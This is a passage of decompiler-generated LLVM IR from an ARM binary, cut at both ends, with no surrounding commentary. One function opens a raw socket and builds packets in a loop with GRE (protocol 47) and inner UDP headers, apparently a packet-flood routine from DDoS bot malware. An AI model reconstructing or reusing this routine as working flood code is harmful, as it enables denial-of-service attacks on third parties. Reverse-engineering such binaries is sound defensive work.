  %v1_ae44 = load i32, i32* @r5, align 4
  %v2_ae44 = add i32 %v1_ae44, 16
  %v3_ae44 = inttoptr i32 %v2_ae44 to i32*
  %v4_ae44 = load i32, i32* %v3_ae44, align 4
  store i32 %v4_ae44, i32* %r3.global-to-local, align 4
  %v3_ae48 = load i32, i32* @r8, align 4
  %v4_ae48 = add i32 %v3_ae48, 2
  %v5_ae48 = inttoptr i32 %v4_ae48 to i16*
  store i16 %v1_ae38, i16* %v5_ae48, align 2
  %v1_ae4c = load i32, i32* %r3.global-to-local, align 4
  %v2_ae4c = load i32, i32* @r6, align 4
  %v3_ae4c = add i32 %v2_ae4c, 16
  %v4_ae4c = inttoptr i32 %v3_ae4c to i32*
  store i32 %v1_ae4c, i32* %v4_ae4c, align 4
  br label %dec_label_pc_ac74

dec_label_pc_ae54:                                ; preds = %.thread31, %dec_label_pc_ac60
  %v0_ae54 = call i32 @function_f700()
  store i32 %v0_ae54, i32* %r0.global-to-local, align 4
  %v1_ae58 = load i32, i32* @r6, align 4
  %v2_ae58 = add i32 %v1_ae58, 16
  %v3_ae58 = inttoptr i32 %v2_ae58 to i32*
  store i32 %v0_ae54, i32* %v3_ae58, align 4
  br label %dec_label_pc_ac74

dec_label_pc_ae60:                                ; preds = %dec_label_pc_ac74
  %v0_ae60 = load i32, i32* @r8, align 4
  %v1_ae60 = add i32 %v0_ae60, 8
  store i32 %v1_ae60, i32* %r0.global-to-local, align 4
  store i32 %v5_a8f8, i32* %r1.global-to-local, align 4
  %v2_ae68 = inttoptr i32 %v1_ae60 to i16*
  %v3_ae68 = call i32 @function_f900(i16* %v2_ae68, i32 %v5_a8f8)
  store i32 %v3_ae68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_acd8

dec_label_pc_ae70:                                ; preds = %dec_label_pc_a970
  store i32 %v3_a960, i32* %r0.global-to-local, align 4
  %v1_ae74 = call i32 @function_1314c(i32 %v3_a960)
  store i32 %v1_ae74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ae78

dec_label_pc_ae78:                                ; preds = %dec_label_pc_a810, %dec_label_pc_ae70
  %v1_ae80 = phi i32 [ %v3_a960, %dec_label_pc_a810 ], [ %v1_ae74, %dec_label_pc_ae70 ]
  store i32 %v3_a810, i32* %r4.global-to-local, align 4
  store i32 %v6_a810, i32* %r5.global-to-local, align 4
  store i32 %v24_a810, i32* %fp.global-to-local, align 4
  ret i32 %v1_ae80

dec_label_pc_ae84:                                ; preds = %dec_label_pc_a998
  %v1_ae8c = add i32 %v5_a8f8, 8
  store i32 %v1_ae8c, i32* %r1.global-to-local, align 4
  %v1_ae90 = add i32 %v5_a8f8, 66
  store i32 %v1_ae90, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_abec.preheader

; uselistorder directives
  uselistorder i32 %v1_ae90, { 1, 0 }
  uselistorder i32 %v1_ae8c, { 1, 0 }
  uselistorder i16 %v1_ae38, { 1, 0 }
  uselistorder i32 %v0_ae38, { 1, 0 }
  uselistorder i32 %v0_ae24, { 1, 0 }
  uselistorder i32 %v3_ae04, { 1, 0 }
  uselistorder i32 %v0_adfc, { 1, 0 }
  uselistorder i32 %v5_add4, { 1, 0 }
  uselistorder i32 %v0_ad98, { 1, 2, 0, 3 }
  uselistorder i32 %v1_ad74, { 1, 2, 0 }
  uselistorder i32 %v1_ad70, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_ad24, { 1, 0, 2 }
  uselistorder i32 %v4_ad20, { 1, 0 }
  uselistorder i32 %v0_ad0c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ad00, { 1, 0 }
  uselistorder i32 %v7_ac14, { 2, 1, 0, 3 }
  uselistorder i1 %v7_ac30, { 2, 1, 0 }
  uselistorder i1 %v2_ae40, { 2, 3, 1, 0 }
  uselistorder i32 %v0_ab84, { 1, 0, 2 }
  uselistorder i32 %v3_aa00, { 1, 0 }
  uselistorder i32 %v3_a9e4, { 1, 2, 0 }
  uselistorder i32 %v1_a9e0, { 1, 0 }
  uselistorder i32 %v1_a9a4, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_a9a0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a99c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a998, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a990, { 1, 0 }
  uselistorder i1 %v7_a964, { 1, 0 }
  uselistorder i32 %v3_a960, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_a94c, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_a918, { 1, 2, 0 }
  uselistorder i32 %v5_a8f8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_a8ac, { 1, 0 }
  uselistorder i32 %v1_a888, { 2, 1, 0 }
  uselistorder i32 %v5_a880, { 1, 0 }
  uselistorder i8 %v5_a864, { 0, 2, 1 }
  uselistorder i32 %v6_a844, { 1, 0 }
  uselistorder i32 %v2_a82c, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r4.global-to-local, { 19, 22, 21, 23, 20, 24, 25, 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r3.global-to-local, { 39, 40, 41, 42, 43, 44, 45, 46, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 33, 34, 35, 36, 37, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r1.global-to-local, { 35, 36, 37, 38, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 24, 23, 25, 26, 28, 27, 29, 30, 32, 31, 34, 33, 0 }
  uselistorder i32* %r0.global-to-local, { 33, 32, 1, 34, 35, 37, 38, 36, 40, 39, 42, 41, 43, 3, 2, 4, 6, 5, 7, 8, 9, 10, 12, 11, 15, 13, 14, 18, 16, 17, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %ip.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %fp.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 15, 16, 17, 18, 19, 20, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ae78, { 1, 0 }
  uselistorder label %dec_label_pc_acd8, { 1, 0 }
  uselistorder label %dec_label_pc_ac74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_abec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_abec.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @function_aea4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_aea4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_aea4 = load i32, i32* @r4, align 4
  %v6_aea4 = load i32, i32* @r5, align 4
  %v24_aea4 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_aec0 = call i32 @function_144a8(i32 %arg1, i32 4)
  %v0_aec4 = load i32, i32* @r5, align 4
  store i32 %v0_aec4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_aed4 = load i32, i32* @r4, align 4
  %v5_aed8 = inttoptr i32 %v0_aec4 to i32*
  %v6_aed8 = call i32 @function_a45c(i32 %v0_aed4, i32* %v5_aed8, i32 2, i32 0)
  %v1_aee4 = urem i32 %v6_aed8, 256
  store i32 %v1_aee4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_aef0 = load i32, i32* @r5, align 4
  store i32 %v0_aef0, i32* %r1.global-to-local, align 4
  %v0_aef4 = load i32, i32* @r4, align 4
  %v5_aef8 = trunc i32 %v6_aed8 to i8
  %v6_aefc = inttoptr i32 %v0_aef0 to i32*
  %v7_aefc = call i32 @function_a45c(i32 %v0_aef4, i32* %v6_aefc, i32 3, i32 65535)
  %v0_af00 = load i32, i32* @r5, align 4
  store i32 %v0_af00, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_aefc, i32* %fp.global-to-local, align 4
  %v0_af10 = load i32, i32* @r4, align 4
  %v4_af14 = inttoptr i32 %v0_af00 to i32*
  %v5_af14 = call i32 @function_a45c(i32 %v0_af10, i32* %v4_af14, i32 4, i32 64)
  %v1_af1c = urem i32 %v5_af14, 256
  store i32 %v1_af1c, i32* %ip.global-to-local, align 4
  %v0_af20 = load i32, i32* @r5, align 4
  store i32 %v0_af20, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_af2c = load i32, i32* @r4, align 4
  %v6_af34 = inttoptr i32 %v0_af20 to i32*
  %v7_af34 = call i32 @function_a45c(i32 %v0_af2c, i32* %v6_af34, i32 5, i32 1)
  %v1_af40 = urem i32 %v7_af34, 256
  store i32 %v1_af40, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_af4c = load i32, i32* @r5, align 4
  store i32 %v0_af4c, i32* %r1.global-to-local, align 4
  %v0_af50 = load i32, i32* @r4, align 4
  %v5_af58 = inttoptr i32 %v0_af4c to i32*
  %v6_af58 = call i32 @function_a45c(i32 %v0_af50, i32* %v5_af58, i32 6, i32 65535)
  %v0_af60 = load i32, i32* @r5, align 4
  store i32 %v0_af60, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_af58, i32* @r8, align 4
  %v0_af70 = load i32, i32* @r4, align 4
  %v4_af74 = inttoptr i32 %v0_af60 to i32*
  %v5_af74 = call i32 @function_a45c(i32 %v0_af70, i32* %v4_af74, i32 7, i32 65535)
  %v0_af78 = load i32, i32* @r5, align 4
  store i32 %v0_af78, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_af74, i32* @r7, align 4
  %v0_af88 = load i32, i32* @r4, align 4
  %v4_af8c = inttoptr i32 %v0_af78 to i32*
  %v5_af8c = call i32 @function_a45c(i32 %v0_af88, i32* %v4_af8c, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_af9c = load i32, i32* @r5, align 4
  store i32 %v0_af9c, i32* %r1.global-to-local, align 4
  %v0_afa0 = load i32, i32* @r4, align 4
  %v4_afa4 = inttoptr i32 %v0_af9c to i32*
  %v5_afa4 = call i32 @function_a45c(i32 %v0_afa0, i32* %v4_afa4, i32 1, i32 1)
  %v1_afac = urem i32 %v5_afa4, 256
  store i32 %v1_afac, i32* %ip.global-to-local, align 4
  %v0_afb0 = load i32, i32* @r5, align 4
  store i32 %v0_afb0, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_afbc = load i32, i32* @r4, align 4
  %v5_afc4 = inttoptr i32 %v0_afb0 to i32*
  %v6_afc4 = call i32 @function_a45c(i32 %v0_afbc, i32* %v5_afc4, i32 19, i32 0)
  %v0_afcc = load i32, i32* @r5, align 4
  store i32 %v0_afcc, i32* %r1.global-to-local, align 4
  %v2_afd0 = load i32, i32* @global_var_23394.88, align 4
  store i32 %v2_afd0, i32* %r3.global-to-local, align 4
  store i32 %v6_afc4, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_afdc = load i32, i32* @r4, align 4
  %v4_afe0 = inttoptr i32 %v0_afcc to i32*
  %v5_afe0 = call i32 @function_a45c(i32 %v0_afdc, i32* %v4_afe0, i32 25, i32 %v2_afd0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_aff4 = call i32 @function_13940(i32 2, i32 3, i32 6)
  %v7_aff8 = icmp eq i32 %v3_aff4, -1
  store i1 %v7_aff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aff8, label %dec_label_pc_b498, label %dec_label_pc_b004

dec_label_pc_b004:                                ; preds = %dec_label_pc_aea4
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b00c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b00c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b020 = call i32 @function_138fc(i32 %v3_aff4, i32 0, i32 3, i32 %v6_b00c, i32 4)
  %v7_b024 = icmp eq i32 %v5_b020, -1
  store i1 %v7_b024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b024, label %dec_label_pc_b490, label %dec_label_pc_b02c

dec_label_pc_b02c:                                ; preds = %dec_label_pc_b004
  %v0_b02c = load i32, i32* @r8, align 4
  %v0_b030 = load i32, i32* @r7, align 4
  %v0_b034 = load i32, i32* %fp.global-to-local, align 4
  %v0_b038 = load i32, i32* @r6, align 4
  %v1_b038 = urem i32 %v0_b038, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_b040 = urem i32 %v0_b02c, 65536
  store i32 %v3_b040, i32* %r3.global-to-local, align 4
  %v3_b044 = urem i32 %v0_b030, 65536
  store i32 %v3_b044, i32* %r4.global-to-local, align 4
  %v0_b048 = load i32, i32* @sl, align 4
  %v2_b048 = icmp eq i32 %v0_b048, 0
  store i1 %v2_b048, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b060 = urem i32 %v0_b034, 65536
  store i32 %v3_b060, i32* @fp, align 4
  br i1 %v2_b048, label %dec_label_pc_b4a4, label %dec_label_pc_b070

dec_label_pc_b070:                                ; preds = %dec_label_pc_b02c
  %v3_b030 = mul i32 %v0_b030, 65536
  %v3_b02c = mul i32 %v0_b02c, 65536
  %v0_b034.not = or i32 %v0_b034, -65536
  %v1_b074 = xor i32 %v0_b034.not, 65535
  %v3_b078 = mul i32 %v5_af8c, 65536
  %v1_b07c = add i32 %v3_b078, 3407872
  %tmp67 = udiv i32 %v1_b07c, 256
  %v3_b090 = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_b074, 256
  %v3_b094 = and i32 %tmp68, 65280
  store i32 %v3_b094, i32* %ip.global-to-local, align 4
  %v1_b098 = add i32 %v3_b078, 524288
  %v1_b0a0 = add i32 %v3_b078, 1835008
  %tmp69 = udiv i32 %v1_b074, 256
  %v4_b0a4 = urem i32 %tmp69, 256
  %v5_b0a4 = or i32 %v4_b0a4, %v3_b094
  %v4_b0ac = udiv i32 %v1_b07c, 16777216
  %v5_b0ac = or i32 %v3_b090, %v4_b0ac
  store i32 %v5_b0ac, i32* @r8, align 4
  %v3_b0b8 = udiv i32 %v1_b0a0, 256
  %tmp70 = mul i32 %v0_b034, 256
  %v3_b0bc = and i32 %tmp70, 65280
  store i32 %v3_b02c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_b034, 256
  %v4_b0cc = urem i32 %tmp71, 256
  %v5_b0cc = or i32 %v4_b0cc, %v3_b0bc
  %tmp72 = mul i32 %v0_b02c, 256
  %v3_b0d0 = and i32 %tmp72, 65280
  %v1_b0d4 = and i32 %v3_b0b8, 65280
  store i32 %v1_b0d4, i32* @r6, align 4
  store i32 %v3_b030, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_b030, 256
  %v3_b0e0 = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_b02c, 256
  %v4_b0e4 = urem i32 %tmp74, 256
  %v5_b0e4 = or i32 %v4_b0e4, %v3_b0d0
  store i32 %v5_b0e4, i32* @lr, align 4
  %v4_b0e8 = udiv i32 %v1_b0a0, 16777216
  %v5_b0e8 = or i32 %v1_b0d4, %v4_b0e8
  store i32 %v5_b0e8, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_b030, 256
  %v4_b0ec = urem i32 %tmp75, 256
  %v5_b0ec = or i32 %v4_b0ec, %v3_b0e0
  %tmp76 = udiv i32 %v1_b098, 256
  %v3_b0f0 = and i32 %tmp76, 65280
  store i32 %v3_b0f0, i32* @r5, align 4
  %v4_b104 = udiv i32 %v1_b098, 16777216
  %v5_b104 = or i32 %v3_b0f0, %v4_b104
  store i32 %v5_b104, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_b158 = sext i8 %v5_aef8 to i32
  %sext12 = mul nuw i32 %v5_b0cc, 65536
  %v4_b17013 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_b0e8, 65536
  %v4_b1d4 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_b0a4, 65536
  %v4_b1d8 = sdiv i32 %sext9, 65536
  %v1_b1e0 = trunc i32 %v4_b1d4 to i16
  %v2_b208 = icmp eq i32 %v1_b038, 0
  %sext10 = mul nuw i32 %v5_b0e4, 65536
  %v4_b228 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_b0ec, 65536
  %v4_b230 = sdiv i32 %sext11, 65536
  %v1_b168 = trunc i32 %v5_af14 to i8
  br label %dec_label_pc_b10c

dec_label_pc_b10c:                                ; preds = %bb82, %dec_label_pc_b070
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_b118 = call i32 @function_144a8(i32 1510, i32 4)
  store i32 %v2_aec0, i32* %r2.global-to-local, align 4
  %v3_b120 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b120, i32* %r3.global-to-local, align 4
  %v2_b124 = load i32, i32* @r4, align 4
  %v5_b124 = mul i32 %v2_b124, 4
  %v6_b124 = add i32 %v5_b124, %v2_aec0
  %v7_b124 = inttoptr i32 %v6_b124 to i32*
  store i32 %v2_b118, i32* %v7_b124, align 4
  %v0_b128 = load i32, i32* %r2.global-to-local, align 4
  %v1_b128 = load i32, i32* %r3.global-to-local, align 4
  %v4_b128 = mul i32 %v1_b128, 4
  %v5_b128 = add i32 %v4_b128, %v0_b128
  %v6_b128 = inttoptr i32 %v5_b128 to i32*
  %v7_b128 = load i32, i32* %v6_b128, align 4
  store i32 %v7_b128, i32* %r4.global-to-local, align 4
  %v1_b12c = inttoptr i32 %v7_b128 to i8*
  %v2_b12c = load i8, i8* %v1_b12c, align 1
  %tmp = urem i8 %v2_b12c, 16
  %v1_b130 = zext i8 %tmp to i32
  %v1_b134 = or i32 %v1_b130, 64
  store i32 %v1_b134, i32* %r2.global-to-local, align 4
  %v1_b138 = trunc i32 %v1_b134 to i8
  store i8 %v1_b138, i8* %v1_b12c, align 1
  %v0_b13c = load i32, i32* %r3.global-to-local, align 4
  %v5_b140 = mul i32 %v0_b13c, 24
  store i32 %v5_b140, i32* %r1.global-to-local, align 4
  %v0_b144 = load i32, i32* %r4.global-to-local, align 4
  %v1_b144 = inttoptr i32 %v0_b144 to i8*
  %v2_b144 = load i8, i8* %v1_b144, align 1
  %v1_b148 = and i8 %v2_b144, -16
  %v1_b14c = or i8 %v1_b148, 5
  store i32 %v1_af40, i32* %r5.global-to-local, align 4
  store i8 %v1_b14c, i8* %v1_b144, align 1
  store i32 %v4_b158, i32* %r2.global-to-local, align 4
  %v2_b15c = load i32, i32* %r4.global-to-local, align 4
  %v3_b15c = add i32 %v2_b15c, 1
  %v4_b15c = inttoptr i32 %v3_b15c to i8*
  store i8 %v5_aef8, i8* %v4_b15c, align 1
  store i32 %v1_af1c, i32* %r3.global-to-local, align 4
  %v0_b164 = load i32, i32* %r5.global-to-local, align 4
  %v2_b164 = icmp eq i32 %v0_b164, 0
  store i1 %v2_b164, i1* %cpsr_z.global-to-local, align 1
  %v2_b168 = load i32, i32* %r4.global-to-local, align 4
  %v3_b168 = add i32 %v2_b168, 8
  %v4_b168 = inttoptr i32 %v3_b168 to i8*
  store i8 %v1_b168, i8* %v4_b168, align 1
  %v0_b16c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b16c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_b10c
  store i32 %v4_b17013, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_b10c
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_b17013, i32* %r5.global-to-local, align 4
  %v3_b174 = load i32, i32* %r4.global-to-local, align 4
  %v4_b174 = add i32 %v3_b174, 6
  %v5_b174 = inttoptr i32 %v4_b174 to i16*
  store i16 64, i16* %v5_b174, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_b17c = load i32, i32* %r4.global-to-local, align 4
  %v3_b17c = add i32 %v2_b17c, 9
  %v4_b17c = inttoptr i32 %v3_b17c to i8*
  store i8 47, i8* %v4_b17c, align 1
  %v0_b180 = load i32, i32* %r4.global-to-local, align 4
  %v1_b180 = add i32 %v0_b180, 20
  store i32 %v1_b180, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_b188 = load i32, i32* %r5.global-to-local, align 4
  %v1_b188 = trunc i32 %v0_b188 to i16
  %v3_b188 = add i32 %v0_b180, 4
  %v4_b188 = inttoptr i32 %v3_b188 to i16*
  store i16 %v1_b188, i16* %v4_b188, align 2
  %v0_b18c = load i32, i32* @r8, align 4
  %v1_b18c = trunc i32 %v0_b18c to i16
  %v2_b18c = load i32, i32* %r4.global-to-local, align 4
  %v3_b18c = add i32 %v2_b18c, 2
  %v4_b18c = inttoptr i32 %v3_b18c to i16*
  store i16 %v1_b18c, i16* %v4_b18c, align 2
  %v0_b190 = load i32, i32* %r3.global-to-local, align 4
  %v1_b190 = trunc i32 %v0_b190 to i16
  %v2_b190 = load i32, i32* %r2.global-to-local, align 4
  %v3_b190 = add i32 %v2_b190, 2
  %v4_b190 = inttoptr i32 %v3_b190 to i16*
  store i16 %v1_b190, i16* %v4_b190, align 2
  store i32 %v5_afe0, i32* %r3.global-to-local, align 4
  %v0_b198 = load i32, i32* %r4.global-to-local, align 4
  %v1_b198 = add i32 %v0_b198, 24
  %v2_b198 = inttoptr i32 %v1_b198 to i8*
  %v3_b198 = load i8, i8* %v2_b198, align 1
  %v4_b198 = zext i8 %v3_b198 to i32
  store i32 %v4_b198, i32* %r2.global-to-local, align 4
  %v2_b19c = add i32 %v0_b198, 12
  %v3_b19c = inttoptr i32 %v2_b19c to i32*
  store i32 %v5_afe0, i32* %v3_b19c, align 4
  %v0_b1a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b1a0 = and i32 %v0_b1a0, -241
  %v1_b1a4 = or i32 %v1_b1a0, 64
  store i32 %v1_b1a4, i32* %r2.global-to-local, align 4
  %v0_b1a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b1a8 = load i32, i32* @sb, align 4
  %v2_b1a8 = add i32 %v1_b1a8, %v0_b1a8
  store i32 %v2_b1a8, i32* %r1.global-to-local, align 4
  %v1_b1ac = add i32 %v2_b1a8, 16
  %v2_b1ac = inttoptr i32 %v1_b1ac to i32*
  %v3_b1ac = load i32, i32* %v2_b1ac, align 4
  store i32 %v3_b1ac, i32* %r1.global-to-local, align 4
  %v1_b1b0 = trunc i32 %v1_b1a4 to i8
  %v2_b1b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b1b0 = add i32 %v2_b1b0, 24
  %v4_b1b0 = inttoptr i32 %v3_b1b0 to i8*
  store i8 %v1_b1b0, i8* %v4_b1b0, align 1
  %v0_b1b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b1b4 = add i32 %v0_b1b4, 24
  %v2_b1b4 = inttoptr i32 %v1_b1b4 to i8*
  %v3_b1b4 = load i8, i8* %v2_b1b4, align 1
  %v1_b1b8 = and i8 %v3_b1b4, -16
  %v1_b1bc = or i8 %v1_b1b8, 5
  store i8 %v1_b1bc, i8* %v2_b1b4, align 1
  %v0_b1c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b1c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_b1c4 = add i32 %v1_b1c4, 16
  %v3_b1c4 = inttoptr i32 %v2_b1c4 to i32*
  store i32 %v0_b1c4, i32* %v3_b1c4, align 4
  %v0_b1cc = load i32, i32* %r4.global-to-local, align 4
  %v1_b1cc = add i32 %v0_b1cc, 24
  store i32 %v1_b1cc, i32* @r5, align 4
  %v3_b1d0 = add i32 %v0_b1cc, 25
  %v4_b1d0 = inttoptr i32 %v3_b1d0 to i8*
  store i8 %v5_aef8, i8* %v4_b1d0, align 1
  store i32 %v4_b1d4, i32* %r2.global-to-local, align 4
  store i32 %v4_b1d8, i32* %r3.global-to-local, align 4
  store i32 %v1_af1c, i32* %r1.global-to-local, align 4
  %v2_b1e0 = load i32, i32* @r5, align 4
  %v3_b1e0 = add i32 %v2_b1e0, 2
  %v4_b1e0 = inttoptr i32 %v3_b1e0 to i16*
  store i16 %v1_b1e0, i16* %v4_b1e0, align 2
  %v0_b1e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b1e4 = trunc i32 %v0_b1e4 to i16
  %v2_b1e4 = load i32, i32* @r5, align 4
  %v3_b1e4 = add i32 %v2_b1e4, 4
  %v4_b1e4 = inttoptr i32 %v3_b1e4 to i16*
  store i16 %v1_b1e4, i16* %v4_b1e4, align 2
  %v0_b1e8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b1e8, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b1f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b1f0 = trunc i32 %v0_b1f0 to i8
  %v2_b1f0 = load i32, i32* @r5, align 4
  %v3_b1f0 = add i32 %v2_b1f0, 8
  %v4_b1f0 = inttoptr i32 %v3_b1f0 to i8*
  store i8 %v1_b1f0, i8* %v4_b1f0, align 1
  %v0_b1f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b1f4, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_b1f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b1f4 = trunc i32 %v1_b1f4 to i16
  %v3_b1f4 = load i32, i32* @r5, align 4
  %v4_b1f4 = add i32 %v3_b1f4, 6
  %v5_b1f4 = inttoptr i32 %v4_b1f4 to i16*
  store i16 %v2_b1f4, i16* %v5_b1f4, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_b1f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b1f8 = trunc i32 %v0_b1f8 to i8
  %v2_b1f8 = load i32, i32* @r5, align 4
  %v3_b1f8 = add i32 %v2_b1f8, 9
  %v4_b1f8 = inttoptr i32 %v3_b1f8 to i8*
  store i8 %v1_b1f8, i8* %v4_b1f8, align 1
  %v0_b1fc = call i32 @function_f700()
  store i32 %v1_b038, i32* %r1.global-to-local, align 4
  store i1 %v2_b208, i1* %cpsr_z.global-to-local, align 1
  %v1_b20c = sub i32 1023, %v0_b1fc
  store i32 %v1_b20c, i32* %r3.global-to-local, align 4
  br i1 %v2_b208, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_b214 = load i32, i32* @r5, align 4
  %v3_b214 = add i32 %v2_b214, 16
  %v4_b214 = inttoptr i32 %v3_b214 to i32*
  store i32 %v1_b20c, i32* %v4_b214, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_b210 = load i32, i32* %r4.global-to-local, align 4
  %v2_b210 = add i32 %v1_b210, 16
  %v3_b210 = inttoptr i32 %v2_b210 to i32*
  %v4_b210 = load i32, i32* %v3_b210, align 4
  store i32 %v4_b210, i32* %r3.global-to-local, align 4
  %v2_b218 = load i32, i32* @r5, align 4
  %v3_b218 = add i32 %v2_b218, 16
  %v4_b218 = inttoptr i32 %v3_b218 to i32*
  store i32 %v4_b210, i32* %v4_b218, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_b21c = load i32, i32* @r5, align 4
